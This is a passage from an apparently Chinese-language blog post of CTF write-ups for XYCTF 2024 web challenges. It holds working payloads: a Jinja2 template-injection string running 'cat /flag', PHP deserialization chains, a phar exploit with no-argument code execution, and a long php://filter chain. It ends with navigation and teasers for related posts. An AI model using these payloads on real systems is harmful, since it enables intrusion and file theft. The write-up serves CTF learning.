+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sentence=草()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(221)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)￥&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&#x27;os&#x27;).popen(&#x27;cat%20/flag&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/XYCTF2024/image-20240409212001772.png" alt="image-20240409212001772"></p>
+<h1 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h1><p>第一层需要$this-&gt;token &#x3D;&#x3D;&#x3D; $this-&gt;password; </p>
+<p>但是这里的token是token&#x3D;md5(mt_rand()); </p>
+<p>这里可以用同地址变量绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;password = &amp;<span class="variable">$a</span>-&gt;token;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里让password的地址等于token的地址，那么当token改变的时候，我们的password就会相应地一起改变。</p>
+<p>下一层：fpclosefpclosefpcloseffflllaaaggg.php</p>
+<p>非常基础的反序列化，没有任何技巧，直接给链子。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num-&gt;lao = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num-&gt;lao-&gt;luo = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num-&gt;lao-&gt;luo-&gt;mack = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>下一层：saber_master_saber_master.php</p>
+<p>主要是这一段：$this-&gt;adwa-&gt;crypto0 !&#x3D; ‘dev1l’ or $this-&gt;adwa-&gt;T1ng !&#x3D; ‘yuroandCMD258’</p>
+<p>我们知道crypto0和T1ng分别在两个类中，adwa不可能既是XYCTFNO2的对象又是XYCTFNO1的对象。</p>
+<h4 id="但是"><a href="#但是" class="headerlink" title="但是"></a>但是</h4><p>反序列化的本质，是我们传入的字符串，而不是题目里的，我们完全在XYCTFNO1类里装入crypto0和T1ng两个属性，并让adwa成为这个类的一个Object</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>=<span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>=<span class="string">&#x27;yuroandCMD258&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;oSthing&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;KickyMu = <span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;KickyMu-&gt;adwa = <span class="keyword">new</span> <span class="title class_">XYCTFNO1</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最后原生类+伪协议读文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo new $_POST[&#x27;X&#x27;]($_POST[&#x27;Y&#x27;]); </span><br></pre></td></tr></table></figure>
+
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET：?CTF=O:8:&quot;XYCTFNO3&quot;:2:&#123;s:7:&quot;KickyMu&quot;;O:8:&quot;XYCTFNO2&quot;:1:&#123;s:4:&quot;adwa&quot;;O:8:&quot;XYCTFNO1&quot;:2:&#123;s:7:&quot;crypto0&quot;;s:5:&quot;dev1l&quot;;s:4:&quot;T1ng&quot;;s:13:&quot;yuroandCMD258&quot;;&#125;&#125;s:5:&quot;N1ght&quot;;s:7:&quot;oSthing&quot;;&#125;</span><br><span class="line"></span><br><span class="line">POST：X=SplFileObject&amp;Y=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<h1 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h1><p>一眼phar反序列化。源码里提示了class.php，这里可以文件包含。</p>
+<p>1、</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>主要是这段，if条件判断就是限制我们只能使用：A-Za-z _ ( ) ;</p>
+<p>这些东西。很明显是想让我们经行无参数rce。第二个eval那里，后面加了脏数据。可以在命令的最后加上来绕过。</p>
+<p>2、在上传页面，后端会检查我们上传的文件里是否含有__halt_compiler();</p>
+<p>这里我们可以把我们生成的phar文件添加到压缩包里，然后把压缩包名字改成.jpg即可绕过。</p>
+<p>3、在class.php页面的包含点，不能在开头使用phar:&#x2F;&#x2F;，这里可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar</span><br></pre></td></tr></table></figure>
+
+<p>4、我们无参数RCE的命令是随机根目录读文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(array_rand(array_flip(scandir(dirname(dirname(dirname(pos(localeconv()))))))));</span><br></pre></td></tr></table></figure>
+
+<p>5、最终exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;readfile(array_rand(array_flip(scandir(dirname(dirname(dirname(pos(localeconv()))))))));__halt_compiler();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将生成的phar文件压缩，改名jpg后上传，然后在class.php页面包含，多刷新几次就有flag了。</p>
+<h1 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h1><p>源码里只看index，藏了个what’s_this.php，现在源码没用了。这个题出的是最没水平的一个题，首先题目页面的小游戏跟题目毫无关系，其次让我们下载了源码，源码为了让我们知道有这么个php文件，为何要多此一举。</p>
+<p>然后这个what’s_this.php的题也是原题了。在hscctf2023里有，当时一个师傅是非预期，这里不再展示。</p>
+<p>做这道题我们需要一个工具。PHP_INCLUDE_TO_SHELL_CHAR_DICT</p>
+<p>github上有这个工具的源码。</p>
+<p>我们需要修改脚本的这个地方为题目中的&#x2F;etc&#x2F;passwd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_to_use = &quot;/etc/passwd&quot;</span><br></pre></td></tr></table></figure>
+
+<p>如果直接用这个脚本，生成的数据后方有脏数据，只能过弱比较，但是这里是强比较。</p>
+<p>这里的思路是经过多次的base64加密和解密，扔掉后方的脏数据。由于base64加密的次数不清楚，所以我们需要手动测试。</p>
+<p>把你需要生成的字符串多次base64编码，**每次编码记得删除后面的&#x3D;**，然后解密的时候记得自己在payload后面加上相应次数的|convert.base64-decode<br>多次尝试，直到生成完美的字符串为止。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">XYCTF-&gt;WFlDVEY=</span><br><span class="line">WFlDVEY-&gt;V0ZsRFZFWQ==</span><br><span class="line">V0ZsRFZFWQ-&gt;VjBac1JGWkZXUQ==</span><br><span class="line">VjBac1JGWkZXUQ-&gt;VmpCYWMxSkdXa1pYVVE=</span><br><span class="line">VmpCYWMxSkdXa1pYVVE-&gt;Vm1wQ1lXTXhTa2RYYTFwWVZWRQ==</span><br><span class="line">Vm1wQ1lXTXhTa2RYYTFwWVZWRQ-&gt;Vm0xd1ExbFhUWGhUYTJSWVlURndXVlpXUlE=</span><br></pre></td></tr></table></figure>
+
+<p>最后经过测试，六次base64编码后得到的字符串Vm0xd1ExbFhUWGhUYTJSWVlURndXVlpXUlE可以使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python php_filter_chain_generator.py --chain Vm0xd1ExbFhUWGhUYTJSWVlURndXVlpXUlE</span><br></pre></td></tr></table></figure>
+
+<p>得到的payload我们取php:&#x2F;&#x2F;filter&#x2F;$p&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd题目需要的$p的部分，并在最后加上六次的base64解密<code>|convert.base64-decode</code></p>
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode</span><br></pre></td></tr></table></figure>
+
+<p>XYCTF{2f22194c-ca27-4795-a8cc-7b290e029faa}</p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<div>分享</div>
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+		
+			<a href="/2024/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/" title="JAVA反序列化——CC1链" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/03/25/NKCTF2024/" title="NKCTF2024">
+								NKCTF2024			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 25日, 2024				
+							</p>
+							<p class="relate-post-content">
+								my first cmshttps://avd.aliyun.com/detail?id=AVD-2024-27622
+弱口令登录
+username : admin
+password : Admin123
+登录进去后：
+
+全世界最简单...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/03/25/NKCTF2024/" title="NKCTF2024">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/4.jpg" alt="NKCTF2024"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/02/29/%E9%9D%92%E5%B0%91%E5%B9%B4ctf-2024/" title="青少年ctf 2024">
+								青少年ctf 2024			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								二月 29日, 2024				
+							</p>
+							<p class="relate-post-content">
+								by:Infernity
+Easy md5需要我们上传两个md5相同的PDF文件。
+新建一个空白PDF文件，拖到fastcoll里得到另外两个pdf文件，上传进去得到flag。
+php的后门是php 8.1dev版本漏洞
+https:...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/02/29/%E9%9D%92%E5%B0%91%E5%B9%B4ctf-2024/" title="青少年ctf 2024">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/3.jpg" alt="青少年ctf 2024"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/02/20/Hgame-2024-week-4/" title="Hgame 2024 week 4">
+								Hgame 2024 week 4			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								二月 20日, 2024				
+							</p>
+							<p class="relate-post-content">
+								by:Infernity
+Reverse and Escalation.一个find提权闹麻了
+这道题是ActiveMQ Jolokia 后台代码执行漏洞
+https://blog.csdn.net/huangyongkang666/...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/02/20/Hgame-2024-week-4/" title="Hgame 2024 week 4">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/Hgame_2024/HgameCTF2024.png" alt="Hgame 2024 week 4"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/02/17/SICTF-Round3/" title="SICTF Round#3">
+								SICTF Round#3			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								二月 17日, 2024				
+							</p>
+							<p class="relate-post-content">
+								by:Infernity
+100％_upload可真气死我了这道题，没注意看url，跟着标题走，一直在文件上传，一直在绕过滤，他要过滤也不过滤全，留个.user.ini没过滤，就一直围绕这个想办法，结果……
+
+打开题目，很明显的提示，...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/02/17/SICTF-Round3/" title="SICTF Round#3">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/2.jpg" alt="SICTF Round#3"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/02/13/Hgame-2024-week-3/" title="Hgame 2024 week 3">
+								Hgame 2024 week 3			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								二月 13日, 2024				
+							</p>
+							<p class="relate-post-content">
+								by:Infernity
+Zero Link这道题我做了好久，源码一大堆，撇去其他的，主要是file.go和routes.go这两个文件。
+首先进入manager页面，需要登录，只有Admin才允许登录，我们需要拿到admin的密码，...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/02/13/Hgame-2024-week-3/" title="Hgame 2024 week 3">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/Hgame_2024/HgameCTF2024.png" alt="Hgame 2024 week 3"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/02/06/Hgame-2024-week-2/" title="Hgame 2024 week 2">
+								Hgame 2024 week 2			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								二月 6日, 2024				
+							</p>
+							<p class="relate-post-content">
+								by:Infernity
+Select More Courses提示已经给的很明显了，弱密码爆破，拿上密码字典去burp里爆破。
+
+爆出密码为qwert123
+然后进入选课界面，发现已达到学分上限，没法选课，那就退出来看第一个增加学分...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/02/06/Hgame-2024-week-2/" title="Hgame 2024 week 2">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/Hgame_2024/HgameCTF2024.png" alt="Hgame 2024 week 2"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/02/05/Begin-CTF-2024/" title="Begin CTF 2024">
+								Begin CTF 2024			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								二月 5日, 2024				
+							</p>
+							<p class="relate-post-content">
+								by:Infernity
+zupload给了源码，看下index.php
+1234567891011121314&lt;?php  error_reporting(0);if ($_SERVER[&#x27;REQUEST_METHO...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/02/05/Begin-CTF-2024/" title="Begin CTF 2024">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/1.jpg" alt="Begin CTF 2024"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/01/31/Hgame%202024%20week%201/" title="Hgame 2024 week 1">
+								Hgame 2024 week 1			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								一月 31日, 2024				
+							</p>
